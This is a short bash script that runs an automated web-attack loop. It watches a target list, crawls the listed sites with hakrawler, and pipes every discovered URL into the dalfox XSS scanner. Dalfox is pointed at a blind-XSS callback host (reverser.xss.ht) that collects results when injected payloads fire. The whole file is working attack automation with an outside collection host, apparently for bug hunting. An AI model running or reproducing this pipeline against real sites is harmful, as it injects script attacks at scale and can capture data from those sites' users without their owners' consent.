#! /bin/bash
while true 
do 
	if [ -s ~/hacking/to_crawl ]
	then 
		cat ~/hacking/to_crawl | anew ~/hacking/crawl_temp | anew ~/hacking/crawl_queue
		cat ~/hacking/crawl_queue | hakrawler -plain | anew ~/hacking/all_crawl_dump 
		cat ~/hacking/all_crawl_dump | ~/go/bin/dalfox -b https://reverser.xss.ht --found-action "notify"
		cat ~/hacking/all_crawl_dump | anew ~/hacking/crawl_history  
		rm ~/hacking/all_crawl_dump
		rm ~/hacking/crawl_queue
		echo "Done and Stopped ..."

	else 
		sleep 15 
		echo "Checking again"

	fi 
done 
